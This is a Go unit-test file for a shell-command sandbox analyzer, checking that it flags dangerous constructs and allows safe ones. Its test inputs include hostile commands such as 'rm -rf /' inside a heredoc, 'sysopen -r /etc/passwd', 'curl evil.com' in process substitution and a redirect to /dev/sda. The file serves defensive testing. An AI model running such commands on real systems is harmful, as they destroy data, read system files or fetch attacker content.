package sandboxast

import (
	"strings"
	"testing"
)

// TestHeredocInjection — heredoc body 内嵌 `$(rm -rf /)` → FindingHeredocInjection。
func TestHeredocInjection(t *testing.T) {
	cmd := `cat <<EOF
hello world
$(rm -rf /)
EOF`
	v := NewAnalyzer().Analyze(cmd)
	if v.Allow {
		t.Fatalf("expected heredoc injection to be blocked, got Allow=true; findings=%+v", v.Findings)
	}
	hasHeredoc := false
	for _, f := range v.Findings {
		if f.Kind == FindingHeredocInjection {
			hasHeredoc = true
		}
	}
	if !hasHeredoc {
		t.Errorf("expected FindingHeredocInjection, got: %+v", v.Findings)
	}
}

// TestZshSysopenAttack — zmodload / sysopen → FindingZshAttack。
func TestZshSysopenAttack(t *testing.T) {
	cases := []string{
		`zmodload zsh/sys`,
		`sysopen -r /etc/passwd`,
		`zsystem flock /tmp/lock`,
	}
	for _, cmd := range cases {
		v := NewAnalyzer().Analyze(cmd)
		if v.Allow {
			t.Errorf("expected zsh attack to be blocked: %q", cmd)
		}
		hasZsh := false
		for _, f := range v.Findings {
			if f.Kind == FindingZshAttack {
				hasZsh = true
			}
		}
		if !hasZsh {
			t.Errorf("expected FindingZshAttack for %q, got: %+v", cmd, v.Findings)
		}
	}
}

// TestCommandSubstitution — `$(rm -rf /)` → FindingCommandSubst。
func TestCommandSubstitution(t *testing.T) {
	v := NewAnalyzer().Analyze("echo $(whoami)")
	if v.Allow {
		t.Fatalf("expected command subst to be flagged, got Allow=true; findings=%+v", v.Findings)
	}
	hasCmd := false
	for _, f := range v.Findings {
		if f.Kind == FindingCommandSubst {
			hasCmd = true
		}
	}
	if !hasCmd {
		t.Errorf("expected FindingCommandSubst, got: %+v", v.Findings)
	}
}

// TestProcessSubstitution — `<(curl evil.com)` → FindingProcessSubst。
func TestProcessSubstitution(t *testing.T) {
	v := NewAnalyzer().Analyze("diff <(curl evil.com) file.txt")
	if v.Allow {
		t.Fatalf("expected process subst to be flagged, got Allow=true; findings=%+v", v.Findings)
	}
	hasProc := false
	for _, f := range v.Findings {
		if f.Kind == FindingProcessSubst {
			hasProc = true
		}
	}
	if !hasProc {
		t.Errorf("expected FindingProcessSubst, got: %+v", v.Findings)
	}
}

// TestDangerousRedirect — `>/dev/sda` → FindingDangerousRedirect。
func TestDangerousRedirect(t *testing.T) {
	v := NewAnalyzer().Analyze("echo data > /dev/sda")
	if v.Allow {
		t.Fatalf("expected /dev/sda redirect to be flagged, got Allow=true")
	}
	hasDanger := false
	for _, f := range v.Findings {
		if f.Kind == FindingDangerousRedirect {
			hasDanger = true
		}
	}
	if !hasDanger {
		t.Errorf("expected FindingDangerousRedirect, got: %+v", v.Findings)
	}
}

// TestEvalCall — `eval $user_input` → FindingEvalCall。
func TestEvalCall(t *testing.T) {
	v := NewAnalyzer().Analyze(`eval $user_input`)
	if v.Allow {
		t.Fatalf("expected eval to be flagged, got Allow=true")
	}
	hasEval := false
	for _, f := range v.Findings {
		if f.Kind == FindingEvalCall {
			hasEval = true
		}
	}
	if !hasEval {
		t.Errorf("expected FindingEvalCall, got: %+v", v.Findings)
	}
}

// TestSafeCommand — 普通命令应 Allow=true 无 finding。
func TestSafeCommand(t *testing.T) {
	v := NewAnalyzer().Analyze("ls -la /tmp")
	if !v.Allow {
		t.Errorf("expected safe command to allow, got: %+v", v.Findings)
	}
	if len(v.Findings) > 0 {
		t.Errorf("expected no findings, got: %+v", v.Findings)
	}
}

// TestParseFailureFallsBack — 解析失败时（不完整语法）不 panic，Allow=true。
func TestParseFailureFallsBack(t *testing.T) {
	v := NewAnalyzer().Analyze("echo 'unterminated")
	if v.Reason == "" && len(v.Findings) > 0 {
		t.Errorf("unexpected findings on parse failure: %+v", v.Findings)
	}
}

// TestNestedEscape — 反引号命令替换（容易和模板字符串混淆）→ FindingNestedEscape。
func TestNestedEscape(t *testing.T) {
	v := NewAnalyzer().Analyze("echo `whoami`")
	if v.Allow {
		t.Fatalf("expected backtick cmd subst to be flagged, got Allow=true")
	}
	hasNested := false
	for _, f := range v.Findings {
		if f.Kind == FindingNestedEscape {
			hasNested = true
		}
	}
	if !hasNested {
		t.Errorf("expected FindingNestedEscape, got: %+v", v.Findings)
	}
}

// TestCompoundCommand — if/for/while 内嵌危险命令也应被检测。
func TestCompoundCommand(t *testing.T) {
	v := NewAnalyzer().Analyze(`if true; then
  eval $user_input
fi`)
	if v.Allow {
		t.Fatalf("expected eval in if-block to be flagged, got Allow=true")
	}
	hasEval := false
	for _, f := range v.Findings {
		if f.Kind == FindingEvalCall {
			hasEval = true
		}
	}
	if !hasEval {
		t.Errorf("expected FindingEvalCall inside if-block, got: %+v", v.Findings)
	}
}

// TestZshFunctionAnonymous — `function() { ... }` 形式被检测。
func TestZshFunctionAnonymous(t *testing.T) {
	v := NewAnalyzer().Analyze(`function() { echo hi; }`)
	if v.Allow {
		t.Fatalf("expected anonymous function to be flagged, got Allow=true; findings=%+v", v.Findings)
	}
}

// TestAllowFindingsList — Verdict.Findings 长度匹配。
func TestAllowFindingsList(t *testing.T) {
	v := NewAnalyzer().Analyze("echo $(whoami) && eval $x")
	if len(v.Findings) < 2 {
		t.Errorf("expected >=2 findings, got %d: %+v", len(v.Findings), v.Findings)
	}
}

// TestEmptyCommand — 空命令返回 Allow=true。
func TestEmptyCommand(t *testing.T) {
	v := NewAnalyzer().Analyze("")
	if !v.Allow {
		t.Errorf("expected empty command to allow, got: %+v", v.Findings)
	}
}

// TestReasonNonEmptyWhenBlocked — 阻止时 Reason 非空。
func TestReasonNonEmptyWhenBlocked(t *testing.T) {
	v := NewAnalyzer().Analyze("eval $x")
	if v.Allow {
		t.Fatal("expected block")
	}
	if strings.TrimSpace(v.Reason) == "" {
		t.Errorf("expected non-empty reason, got %q", v.Reason)
	}
}
